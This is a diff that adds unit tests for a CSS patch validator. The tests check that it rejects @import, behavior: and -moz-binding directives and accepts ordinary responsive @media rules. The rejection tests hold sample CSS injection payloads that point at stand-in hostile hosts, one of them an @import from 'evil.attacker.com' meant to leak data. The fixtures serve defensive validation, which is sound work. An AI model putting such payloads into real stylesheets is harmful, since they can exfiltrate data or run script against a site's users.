@@ -179,3 +179,48 @@ def test_patch_validator_whitespace_tolerance():
     assert res["validation_status"] is True
     assert res["target_file"] == "app-under-test/src/styles/defects.css"
 
+
+def test_reject_css_import_directive():
+    """Verify @import directives in CSS diff or file content are strictly rejected."""
+    target = "app-under-test/src/styles/defects.css"
+    diff = "+@import url('https://evil.attacker.com/leak.css');\n+.btn { width: 100%; }"
+    res = validate_patch(target, diff)
+    assert res["validation_status"] is False
+    assert "@import" in res["validator_errors"]
+
+
+def test_reject_css_behavior_directive():
+    """Verify behavior: property in CSS diff or file content is rejected."""
+    target = "app-under-test/src/styles/defects.css"
+    diff = "+.banner { behavior: url(evil.htc); }"
+    res = validate_patch(target, diff)
+    assert res["validation_status"] is False
+    assert "behavior" in res["validator_errors"]
+
+
+def test_reject_css_moz_binding_directive():
+    """Verify -moz-binding property in CSS is rejected."""
+    target = "app-under-test/src/styles/defects.css"
+    diff = "+.banner { -moz-binding: url(evil.xml#xss); }"
+    res = validate_patch(target, diff)
+    assert res["validation_status"] is False
+    assert "-moz-binding" in res["validator_errors"]
+
+
+def test_accept_valid_responsive_css_media_queries():
+    """Verify valid CSS with @media queries and standard layout rules passes validation."""
+    target = "app-under-test/src/styles/defects.css"
+    diff = """
++@media (max-width: 600px) {
++  .checkout-container {
++    display: flex;
++    flex-direction: column;
++    width: 100%;
++  }
++}
+"""
+    res = validate_patch(target, diff)
+    assert res["validation_status"] is True
+    assert res["validator_errors"] is None
+
+
